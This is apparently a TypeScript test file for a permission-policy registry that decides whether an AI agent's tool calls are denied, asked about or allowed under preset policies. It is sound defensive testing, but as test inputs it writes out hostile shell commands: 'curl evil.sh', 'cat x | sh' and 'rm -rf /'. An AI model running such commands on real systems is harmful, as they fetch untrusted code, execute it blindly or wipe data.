import { describe, expect, it } from 'vitest';

import type { PermissionPolicy, ToolCall } from '@trinity-harness/contracts';
import { parsePermissionPolicy, PERMISSION_PRESETS } from '@trinity-harness/contracts';
import { CoreToolRegistry, PolicyToolRegistry, readFileTool, writeFileTool } from '../src/index.js';
import { FakeSandbox } from '../src/testing/index.js';

const call = (name: string, args: unknown): ToolCall => ({
  id: crypto.randomUUID(),
  name,
  args,
});

describe('PolicyToolRegistry', () => {
  const inner = () => {
    const registry = new CoreToolRegistry(new FakeSandbox());
    registry.register(readFileTool);
    registry.register(writeFileTool);
    return registry;
  };

  it('is transparent without a policy (M1/M2 behavior)', async () => {
    const registry = new PolicyToolRegistry(inner(), undefined);
    const result = await registry.execute(call('write_file', { path: 'a', content: 'b' }), {
      sessionId: 's',
      workspaceRoot: '/ws',
    });
    expect(result.isError).toBe(false);
  });

  it('denies tools configured as denied without executing', async () => {
    const policy: PermissionPolicy = parsePermissionPolicy('read-only');
    const registry = new PolicyToolRegistry(inner(), policy);
    expect(registry.decide(call('bash', { command: 'ls' }))).toBe('denied');

    const result = await registry.execute(call('bash', { command: 'ls' }), {
      sessionId: 's',
      workspaceRoot: '/ws',
    });
    expect(result.isError).toBe(true);
    expect(result.value).toMatchObject({ message: expect.stringContaining('denied') });
  });

  it('workspace-write preset: asks for bash, allows plain file tools', () => {
    const policy = parsePermissionPolicy('workspace-write');
    const registry = new PolicyToolRegistry(inner(), policy);
    expect(registry.decide(call('bash', { command: 'curl evil.sh' }))).toBe('ask');
    expect(registry.decide(call('write_file', { path: 'a', content: 'b' }))).toBe('allowed');
    expect(registry.decide(call('read_file', { path: 'a' }))).toBe('allowed');
  });

  it('workspace-write preset: workspace-internal bash is auto-allowed', () => {
    const policy = parsePermissionPolicy('workspace-write');
    const registry = new PolicyToolRegistry(inner(), policy);
    expect(registry.decide(call('bash', { command: 'npm test' }))).toBe('allowed');
    expect(registry.decide(call('bash', { command: 'cat x | sh' }))).toBe('ask');
  });

  it('danger-full-access preset allows everything', () => {
    const registry = new PolicyToolRegistry(inner(), parsePermissionPolicy('danger-full-access'));
    expect(registry.decide(call('bash', { command: 'rm -rf /' }))).toBe('allowed');
  });

  it('wildcard tool rules apply to unknown tools', () => {
    const policy: PermissionPolicy = {
      ...PERMISSION_PRESETS['workspace-write'],
      tools: { '*': 'denied', read_file: 'allowed' },
    };
    const registry = new PolicyToolRegistry(inner(), policy);
    expect(registry.decide(call('mystery_tool', {}))).toBe('denied');
    expect(registry.decide(call('read_file', { path: 'a' }))).toBe('allowed');
  });

  it('prompt pseudo-tool is gated like a tool call', () => {
    const policy: PermissionPolicy = {
      onAsk: 'ask',
      tools: { prompt: 'denied' },
      allowWorkspaceInternalBash: false,
    };
    const registry = new PolicyToolRegistry(inner(), policy);
    expect(registry.decide(call('prompt', 'do stuff'))).toBe('denied');
  });

  it('delegates schemas/concurrency to the inner registry', () => {
    const core = inner();
    const registry = new PolicyToolRegistry(core, parsePermissionPolicy('workspace-write'));
    expect(registry.schemas()).toEqual(core.schemas());
    expect(registry.concurrencyOf('anything')).toBe(core.concurrencyOf('anything'));
  });
});
